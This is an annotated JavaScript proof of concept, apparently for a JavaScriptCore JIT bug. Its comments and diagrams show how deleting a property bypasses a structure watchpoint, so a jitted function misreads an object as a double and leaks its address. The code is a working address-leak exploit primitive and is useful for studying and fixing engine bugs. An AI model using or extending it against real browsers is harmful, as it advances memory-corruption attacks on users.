var obj = [4.2];
/*
  An array obj is created and is described by a simple Structure:
    
    +-------------------+
    |                   |
    |  Original  array  |
    | (current  struct) |
    +-------------------+
*/

obj.a = 10;
/*
  A new property is added dynamically, which means a new Structure has to be created
  to describe the new object:
    
    +-------------------+       +-------------------+
    |                   |       |                   |
    |  Original  array  | ----> | Added  property a |
    |                   |       | (current  struct) |
    +-------------------+       +-------------------+
*/

obj.b = 20;
/*
  Same scenario as above:
    
    +-------------------+       +-------------------+       +-------------------+
    |                   |       |                   |       |                   |
    |  Original  array  | ----> | Added  property a | ----> | Added  property b |
    |                   |       |                   |       | (current  struct) |
    +-------------------+       +-------------------+       +-------------------+
*/

function get_first_elmt() {
    return obj[0];
}

for (var i = 0; i < 100000; i++) {
    get_first_elmt();
}
/*
  Now the function get_first_elmt is jitted. It expects to read the first element of
  the array stored in obj as a double. Since all these information are stored in
  the structure describing obj, a watchpoint is put on it by the JIT engine. 
    
    +-------------------+       +-------------------+       +-------------------+
    |                   |       |                   |       | (Watchpoint here)	|
    |  Original  array  | ----> | Added  property a | ----> | Added  property b |
    |                   |       |                   |       | (current  struct) |
    +-------------------+       +-------------------+       +-------------------+
*/

delete obj.b;
/*
  The latest added property, b, is removed with tryDeletePropertyQuickly. No transition
  occurs and the watchpoint is not triggered. However, the structure used to describe
  the object obj is changed back to "Added property a".
    
    +-------------------+       +-------------------+       +-------------------+
    |                   |       |                   |       | (Watchpoint here)	|
    |  Original  array  | ----> | Added  property a | ----> | Added  property b |
    |                   |       | (current  struct) |       |                   |
    +-------------------+       +-------------------+       +-------------------+
*/

obj[0] = {};
/*
  Now we can do almost anything we want on obj. It will not trigger the Watchpoint
  on the structure "Added property b", since we're modifying a completely different
  object.
  Here I replaced the first element of the array from a double to an object.
  Printing it in the following instruction will leak its address.
    
    +-------------------+       +-------------------+       +-------------------+
    |                   |       |                   |       | (Watchpoint here)	|
    |  Original  array  | ----> | Added  property a | ----> | Added  property b |
    |                   |       |                   |       |                   |
    +-------------------+       +-------------------+       +-------------------+
                                          |
                                          |
                                          v
                                +-------------------+
                                |                   |
                                |  New typed array  |
                                | (current  struct) |
                                +-------------------+
*/

print(get_first_elmt()); // Leak of an object's address.
